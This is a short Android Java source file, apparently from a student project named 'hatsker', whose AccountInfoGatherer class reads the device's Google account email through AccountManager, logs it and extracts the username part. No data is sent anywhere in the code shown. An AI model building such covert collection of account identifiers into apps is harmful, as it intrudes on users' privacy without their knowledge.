package com.example.student.hatsker;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Context;
import android.util.Log;

import java.util.LinkedList;
import java.util.List;

/**
 * Created by student on 26.07.17.
 */

public class AccountInfoGatherer implements Gatherer {

    private final Context context;

    AccountInfoGatherer(Context context)
    {
        this.context = context;
    }

    public String getInfo() {
        String strGmail = null;
        try {
            Account[] accounts = AccountManager.get(context).getAccounts();
            Log.e("PIKLOG", "Size: " + accounts.length);
            for (Account account : accounts) {

                String possibleEmail = account.name;
                String type = account.type;

                if (type.equals("com.google")) {

                    strGmail = possibleEmail;
                    Log.e("PIKLOG", "Emails: " + strGmail);
                    break;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
            strGmail = "no account found";
        }

        return strGmail;
    }

    public static String getUsername(MainActivity this_) {
        List<String> possibleEmails = null;
        try {
            AccountManager manager = AccountManager.get(this_);
            Account[] accounts = manager.getAccountsByType("com.google");
            possibleEmails = new LinkedList<>();

            for (Account account : accounts) {


                possibleEmails.add(account.name);
            }
        } catch (Exception e) {
            e.printStackTrace();
            if (possibleEmails != null) {
                possibleEmails.clear();
            }
        }

        if (possibleEmails != null) {
            if (!possibleEmails.isEmpty() && possibleEmails.get(0) != null) {
                String email = possibleEmails.get(0);
                String[] parts = email.split("@");
                if (parts.length > 0 && parts[0] != null) {
                    return parts[0];

                } else {
                    return null;
                }
            } else {
                return null;
            }
        } else {
            return null;
        }
    }

}
